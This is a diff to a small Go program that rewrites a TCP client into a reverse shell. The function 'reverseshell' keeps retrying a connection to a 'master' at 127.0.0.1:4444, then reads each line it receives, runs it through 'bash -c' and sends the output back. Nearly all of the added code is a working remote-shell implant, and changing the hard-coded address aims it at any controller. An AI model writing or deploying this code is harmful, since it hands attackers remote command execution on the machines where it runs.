@@ -2,36 +2,43 @@ package main
 
 import (
 	"bufio"
-	"fmt"
 	"log"
 	"net"
-	"os"
+	"os/exec"
 	"time"
 )
 
 func main() {
-	c, _ := net.Dial("tcp", "127.0.0.1:4444") //net.Dial is used to connect to the remote server
-	//listener
+	var master_ip string
+	master_ip = "127.0.0.1:4444"
+	reverseshell(master_ip)
+}
+
+func reverseshell(addr string) {
+chk_conn:
+	// make sure the master is online
 	for {
-		/* Get user input verified by os.Stdin */
-		reader := bufio.NewReader(os.Stdin)
-		fmt.Print(">> ")
-		text, _ := reader.ReadString('\n')
-		fmt.Fprintf(c, text+"\n")
+		c, e := net.Dial("tcp", addr)
+		if e != nil {
+			time.Sleep(3 * time.Second)
+		} else {
+			c.Close()
+			break
+		}
 	}
 
-	//COMMANDS TO GIVE REMOST HOST A SHELL
-	/*
-		for {
-			attackerCommands, _ := bufio.NewReader(c).ReadString('\n')
-			cmd := exec.Command("bash", "-c", attackerCommands)
-			if err != nil {
-				log.Fatalln(err)
-			}
-			out, _ := cmd.CombinedOutput()
-
-			c.Write(out)
-		} */
+	// now send out our shell
+	conn, _ := net.Dial("tcp", addr)
+	for {
+		status, disconn := bufio.NewReader(conn).ReadString('\n')
+		if disconn != nil {
+			goto chk_conn
+			break
+		}
+		cmd := exec.Command("bash", "-c", status)
+		out, _ := cmd.Output()
+		conn.Write([]byte(out))
+	}
 }
 
 func handleIncomingConnection(conn net.Conn) {
